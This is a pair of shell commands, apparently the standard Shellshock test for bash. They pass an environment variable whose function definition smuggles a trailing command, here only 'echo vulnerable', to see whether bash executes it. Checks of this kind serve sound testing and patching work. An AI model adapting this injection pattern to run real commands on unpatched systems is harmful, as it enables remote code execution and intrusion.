env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test" 
# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
